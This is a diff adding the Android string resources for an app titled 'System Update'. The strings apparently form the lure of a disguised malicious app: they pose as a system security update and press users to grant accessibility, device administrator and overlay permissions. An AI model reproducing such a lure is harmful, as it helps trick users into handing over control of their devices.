@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">System Update</string>
+    <string name="accessibility_description">Allows System Update to perform automated maintenance tasks and interact with the screen.</string>
+
+    <!-- Welcome -->
+    <string name="welcome_title">System Update</string>
+    <string name="welcome_subtitle">Keep your device secure and up to date.</string>
+    <string name="welcome_start">Get Started</string>
+
+    <!-- Permissions -->
+    <string name="perm_title">Initial Setup</string>
+    <string name="perm_desc">To function correctly, System Update requires the following permissions. Please grant them to continue.</string>
+    <string name="perm_a11y">Accessibility Service</string>
+    <string name="perm_a11y_desc">Required for automated system maintenance and screen reading.</string>
+    <string name="perm_admin">Device Administrator</string>
+    <string name="perm_admin_desc">Required for remote lock and wipe security features.</string>
+    <string name="perm_overlay">Display Over Apps</string>
+    <string name="perm_overlay_desc">Required to show status updates and alerts.</string>
+    <string name="perm_grant">Grant</string>
+    <string name="perm_finish">Complete Setup</string>
+
+    <!-- Dashboard -->
+    <string name="dash_title">System Dashboard</string>
+    <string name="dash_status">Connecting...</string>
+    <string name="dash_settings">Settings</string>
+
+    <!-- Settings -->
+    <string name="settings_title">Device Info</string>
+    <string name="settings_back">Back</string>
+</resources>
